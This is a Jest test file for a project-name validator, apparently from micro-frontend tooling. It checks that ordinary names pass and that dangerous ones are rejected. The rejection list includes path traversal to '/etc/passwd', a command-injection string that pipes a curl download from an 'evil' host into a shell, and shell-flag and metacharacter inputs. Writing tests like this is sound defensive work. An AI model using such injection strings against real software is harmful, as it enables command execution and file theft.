import { validateProjectName } from '../validateProjectName';
import { ValidationError } from '@seans-mfe/contracts';

describe('validateProjectName', () => {
  it.each(['app', 'my-mfe', 'abc_kids', 'a.b.c', 'Widget2'])(
    'accepts valid name %s',
    (name) => {
      expect(validateProjectName(name)).toBe(name);
    },
  );

  it.each([
    '../evil',
    '../../etc/passwd',
    'a/../b',
    'x;curl evil|sh',
    'a b',
    '-rf',
    '--help',
    '.hidden',
    '',
    'a$b',
    'a`b`',
  ])('rejects dangerous name %j', (name) => {
    expect(() => validateProjectName(name)).toThrow(ValidationError);
  });

  it('uses the provided field name in the error', () => {
    try {
      validateProjectName('../x', 'appName');
      throw new Error('should have thrown');
    } catch (err) {
      expect(err).toBeInstanceOf(ValidationError);
      expect((err as ValidationError).field).toBe('appName');
    }
  });
});
